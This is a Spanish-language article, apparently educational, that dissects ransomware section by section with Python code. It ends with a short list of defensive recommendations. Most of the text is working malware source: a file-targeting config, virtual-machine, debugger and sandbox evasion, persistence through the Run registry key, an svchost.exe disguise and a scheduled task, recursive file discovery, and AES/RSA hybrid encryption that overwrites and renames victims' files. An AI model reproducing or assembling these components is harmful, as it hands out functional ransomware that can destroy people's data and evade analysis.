01. Punto de entrada – Librerías clave

Todo ransomware inicia importando módulos que le otorgan capacidades para interactuar con el sistema, cifrar archivos, comunicarse con servidores C2 y evadir análisis. La siguiente tabla muestra las librerías más comunes, su uso legítimo y el riesgo que representan en un contexto malicioso.

02. Configuración interna

Aquí se definen las extensiones objetivo, rutas excluidas, nombre de la nota de rescate y un marcador interno para identificar archivos cifrados.

CONFIG = {
    "target_extensions": [
        ".docx", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt",
        ".csv", ".db", ".sqlite", ".zip", ".rar", ".7z", ".bak",
        ".backup", ".doc", ".xls", ".ppt", ".pptx", ".odt", ".ods"
    ],
    "excluded_paths": [
        "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
        "C:\\ProgramData", "C:\\Users\\All Users", "C:\\$Recycle.Bin",
        "C:\\System Volume Information", "C:\\Boot", "/boot", "/dev",
        "/proc", "/sys", "/etc", "/usr/bin", "/usr/sbin", "/var/log",
        "/tmp", "/run", "/System", "/Library", "/Applications"
    ],
    "note_name": "READ_ME_TO_DECRYPT.txt",
    "marker": "[ENCRYPTED_BY_RANSOMWARE]"
}

Más de 20 extensiones objetivo y más de 20 rutas excluidas para evitar dañar el sistema operativo o entornos críticos.

03. Validación del entorno

Función que detecta máquinas virtuales, debuggers, sandboxes (por RAM baja) y verifica privilegios de administrador. Si se detecta un entorno de análisis, el malware se detiene.

import platform, sys, ctypes, psutil

def check_environment():
    # Detectar máquina virtual
    if platform.processor() == "GenuineIntel" and "VMware" in platform.version():
        print("VM detectada, saliendo...")
        sys.exit(1)
    # Detectar debugger (Windows)
    if sys.platform == "win32" and ctypes.windll.kernel32.IsDebuggerPresent() != 0:
        print("Debugger detectado, saliendo...")
        sys.exit(1)
    # Sandbox por RAM baja
    if psutil.virtual_memory().total < 2 * 1024**3:
        print("Sandbox detectado (poca RAM), saliendo...")
        sys.exit(1)
    # Privilegios
    if os.name == 'nt':
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        is_admin = os.geteuid() == 0
    if not is_admin:
        print("Ejecutando sin privilegios, algunas rutas no serán accesibles")
    return is_admin

04. Persistencia

El ransomware se asegura de ejecutarse cada vez que el sistema se reinicia mediante la clave de registro Run, copiándose a AppData y creando una tarea programada.

import shutil, subprocess, winreg

def establish_persistence():
    if sys.platform == "win32":
        # Registro de Windows
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        # Copiar a AppData
        persistent_path = os.path.join(os.environ['APPDATA'], 'svchost.exe')
        shutil.copy2(sys.executable, persistent_path)
        # Tarea programada diaria
        subprocess.run(f'schtasks /create /tn "SystemCheck" /tr "{persistent_path}" /sc daily /st 09:00 /f', shell=True)

05. Descubrimiento de archivos y rutas

Recorre recursivamente un directorio base, filtra por extensiones objetivo y excluye rutas sensibles del sistema. Retorna una lista de rutas a cifrar.

from pathlib import Path

def discover_files(base_path):
    files_found = []
    base = Path(base_path)
    for item in base.rglob("*"):
        if item.is_file() and item.suffix.lower() in CONFIG["target_extensions"]:
            excluded = any(excl in str(item.parent) for excl in CONFIG["excluded_paths"])
            if not excluded:
                files_found.append(item)
    return files_found

06. Preparación criptográfica

Genera una clave AES‑256 y un vector de inicialización (IV). Luego cifra la clave AES con una clave pública RSA (cifrado híbrido). El material cifrado se envía al servidor C2 o se guarda localmente.

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
import os

def setup_crypto():
    aes_key = os.urandom(32)       # AES-256
    iv = os.urandom(16)            # IV para CBC
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    with open("encrypted_key.bin", "wb") as f:
        f.write(encrypted_aes_key)
    return {"aes_key": aes_key, "iv": iv, "private_key": private_key}

07. Encripción (cifrado de archivos)

Lee el archivo original, aplica padding PKCS7, lo cifra con AES‑CBC usando la clave y IV generados, sobrescribe el contenido original y finalmente renombra el archivo añadiendo .encrypted.

def process_file(file_path, crypto_context):
    with open(file_path, "rb") as f:
        data = f.read()
    cipher = Cipher(algorithms.AES(crypto_context["aes_key"]), modes.CBC(crypto_context["iv"]))
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(data) % 16)
    data_padded = data + bytes([pad_len] * pad_len)
    transformed_data = encryptor.update(data_padded) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(transformed_data)
    new_path = file_path.with_suffix(file_path.suffix + ".encrypted")
    file_path.rename(new_path)

08. Manejo de nombres y extensiones

Función auxiliar que agrega una extensión personalizada (por ejemplo .crypted) al nombre del archivo, dejando clara evidencia del ataque.

def rename_artifact(file_path):
    new_name = str(file_path) + ".crypted"
    os.rename(file_path, new_name)
    return new_name

En el código de cifrado ya se realiza un renombrado a .encrypted, esta función sirve como ejemplo de una modificación adicional.

Reflexión técnica y consideraciones

El análisis de la anatomía de un ransomware muestra que, aunque el cifrado asimétrico o híbrido parece complejo, el verdadero punto débil suele ser la ausencia de controles básicos: falta de MFA, cuentas obsoletas, segmentación TI/OT deficiente y respaldos inadecuados. Este código educativo demuestra que con librerías estándar de Python (cryptography, os, pathlib) se puede construir un ransomware funcional. Por ello, las organizaciones deben priorizar:

  • Autenticación multifactor en todos los accesos remotos.
  • Segmentación estricta entre redes TI y OT.
  • Respaldos offline (air‑gapped) probados periódicamente.
  • Monitoreo continuo con detección de exfiltración de datos.
  • Simulacros de ransomware para validar planes de respuesta.
